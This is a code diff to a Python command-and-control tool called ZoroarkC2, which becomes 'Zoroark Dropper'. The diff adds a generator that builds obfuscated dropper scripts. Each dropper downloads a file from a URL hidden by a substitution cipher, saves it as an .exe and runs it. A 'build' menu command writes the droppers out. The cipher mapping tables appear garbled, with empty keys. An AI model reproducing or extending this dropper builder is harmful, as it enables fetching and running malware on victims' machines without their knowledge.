@@ -9,7 +9,36 @@ import json
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import serialization
 
+mapping = {
+    "": "a",
+    "": "b",
+    "": "c",
+    "": "d",
+    "": "e",
+    "": "f",
+    "": "g",
+    "": "h",
+    "": "i",
+    "": "j",
+    "": "k",
+    "": "l",
+    "": "m",
+    "": "n",
+    "": "o",
+    "": "p",
+    "": "q",
+    "": "r",
+    "": "s",
+    "": "t",
+    "": "u",
+    "": "v",
+    "": "w",
+    "": "x",
+    "": "y",
+    "": "z"
+}
 
+encode_mapping = {v: k for k, v in mapping.items()}
 
 DEFAULT_CONFIG = {
     "default_error_color": "red",
@@ -20,6 +49,58 @@ DEFAULT_CONFIG = {
     "default_ascii_banner_color": "red"
 }
 
+basic_dropper_code = """
+import requests as grwughuwrygwr
+import os as rhgureuiherje
+
+mapping = {
+    "": "a",
+    "": "b",
+    "": "c",
+    "": "d",
+    "": "e",
+    "": "f",
+    "": "g",
+    "": "h",
+    "": "i",
+    "": "j",
+    "": "k",
+    "": "l",
+    "": "m",
+    "": "n",
+    "": "o",
+    "": "p",
+    "": "q",
+    "": "r",
+    "": "s",
+    "": "t",
+    "": "u",
+    "": "v",
+    "": "w",
+    "": "x",
+    "": "y",
+    "": "z"
+}
+
+decode_mapping = mapping
+
+def wrhwrjrwjwrj(text):
+    return "".join(decode_mapping.get(c, c) for c in text)
+
+def wrhuwrihjwrwrh():
+    wrhjiowrjhwrh = None
+    bnwriuihrwhwrjwrj = wrhwrjrwjwrj(wrhjiowrjhwrh)
+    wgwjrgwr = grwughuwrygwr.get(bnwriuihrwhwrjwrj)
+    if wgwjrgwr.status_code == 200:
+        hetjihjetiuh = wgwjrgwr.content
+        with open("gwhguwrhgwr.exe", "wb") as wgwh:
+            wgwh.write(hetjihjetiuh)
+        rhgureuiherje.system('gwhguwrhgwr.exe')
+
+
+if __name__ == '__main__':
+    wrhuwrihjwrwrh()"""
+
 connected_clients_count = 0
 status_online = "Offline"
 connected_clients = []
@@ -28,31 +109,16 @@ connected_clients = []
 def banner():
     print(f"""
 [{DEFAULT_CONFIG['default_ascii_banner_color']}]
-                  **          %                  
-               # %#*%@%*   %##                   
-             @#%#########%%%###=    %%#          
-        #  **######################%%            
-        %%##########################             
-       %#######**####################%%          
-      ######*##*####%###############%#%#@        
-      #####****%%%%%%%############%#%*   #*      
-      %##*#*#*#%%%%%%%#%%#%*#**%%%%%%@           
-      %***####%%%%%%%###*****#*%%%%%%@           
-     ##*%  @%%%%%%%%%******#%%%%%%%%%            
-            %%%%%%%#*#%##%%%%%%%%%%%@            
-          @%   #@@@##%#     #@@%%%%%             
-      %###%%        %#***       #%%+%%%%         
-  %****#%           #**##%**%   @+*+%%%%%%       
-+#%##*#         @***%#*#%**%**%@%%%%%%%%%%%%    *
- # +         %*******###*#******%%%%%%%%%%%##### 
-           *+****#****%##********%%%%%%%%%###*%  
-            %*##%         #*******@%%%%%%###     
-               @%%%%       %******##%            
-               %##%%         **+*#####@          
-            #%%***%                #####         
-             *%                    #####         
-                                  ##%*##@        
-                                  * @% @*        
+▒███████▒ ▒█████   ██▀███   ▒█████   ▄▄▄       ██▀███   ██ ▄█▀
+▒ ▒ ▒ ▄▀░▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒▒████▄    ▓██ ▒ ██▒ ██▄█▒ 
+░ ▒ ▄▀▒░ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ 
+  ▄▀▒   ░▒██   ██░▒██▀▀█▄  ▒██   ██░░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ 
+▒███████▒░ ████▓▒░░██▓ ▒██▒░ ████▓▒░ ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄
+░▒▒ ▓░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
+░░▒ ▒ ░ ▒  ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░
+░ ░ ░ ░ ░░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒    ░   ▒     ░░   ░ ░ ░░ ░ 
+  ░ ░        ░ ░     ░         ░ ░        ░  ░   ░     ░  ░   
+░                                                                 
 [/{DEFAULT_CONFIG['default_ascii_banner_color']}]
   
 """)
@@ -270,13 +336,43 @@ def load_config_runtime(command):
         load_config(parts[1])
 
 
+def encode_url(plain_url):
+    return "".join(encode_mapping.get(c, c) for c in plain_url)
+
+def build_dropper(URL: str):
+    encoded_url = encode_url(URL)
+    dropper_code = basic_dropper_code.replace(
+        "wrhjiowrjhwrh = None",
+        f'wrhjiowrjhwrh = "{encoded_url}"'
+    )
+
+    with open("builds\\basic_dropper.py", "w", encoding="utf-8") as f:
+        f.write(dropper_code)
+    f.close()
+
+def build_options(command):
+    parts = command.split()
+    if len(parts) > 2:
+        print(f"[[{DEFAULT_CONFIG['default_error_color']}]ERROR[/{DEFAULT_CONFIG['default_error_color']}]] Right usage:")
+        print("build -h(optional) <url>")
+    elif len(parts) == 2:
+        if parts[1] == "-h":
+            print("build <raw URL>")
+        elif parts[1].startswith("http"):
+            print("[+] Building dropper...")
+            build_dropper(parts[1])
+            print("[+] Successfully build dropper!")
+        else:
+            print("[!] For help use build -h")
+
+
 def draw_gui():
     """Clears the screen and draws the main menu interface."""
     os.system('cls' if os.name == 'nt' else 'clear') 
     banner()
-    print(f"{40 * " "}╔════════════════════╗")
-    print(f"{40 * " "}║Welcome to ZoroarkC2║")
-    print(f"{40 * " "}╚══╦═══════════════╦═╝")
+    print(f"{40 * " "}╔══════════════════════════╗")
+    print(f"{40 * " "}║Welcome to Zoroark Dropper║")
+    print(f"{40 * " "}╚══╦═══════════════╦═══════╝")
     print(f"{40 * " "}   ║               ║")
     
     currentst = ""
@@ -306,7 +402,8 @@ def main():
             print("Config provided. Loading...")
             load_config(args.config)
 
-
+    if not os.path.exists("builds"):
+        os.mkdir("builds")
     draw_gui()
     
     #print(f"[DEBUG] {DEFAULT_CONFIG}")
@@ -335,7 +432,8 @@ def main():
         elif option.startswith("cload"):
             load_config_runtime(option)
             draw_gui()
-
+        elif option.startswith("build"):
+            build_options(option)
 
 
 
